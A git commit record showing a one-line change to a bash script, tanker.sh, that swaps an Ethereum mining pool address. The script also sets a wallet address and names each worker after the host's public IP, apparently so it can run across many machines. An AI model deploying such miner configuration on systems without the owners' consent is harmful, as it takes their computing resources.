69d293a8222316e675128fe007fa34aa538807cc
fadilsiregar717 <79566297+fadilsiregar717@users.noreply.github.com>
2021-02-24 14:44:05 +0700

    Update tanker.sh

--- tanker.sh
+++ tanker.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 
-POOL=ethproxy+tcp://asia1.ethermine.org:4444
+POOL=eth.f2pool.com:6688
 WALLET=0x7f5efa9e926a94ded7b22125b870fd0846aa5d34
 WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-tnk
 
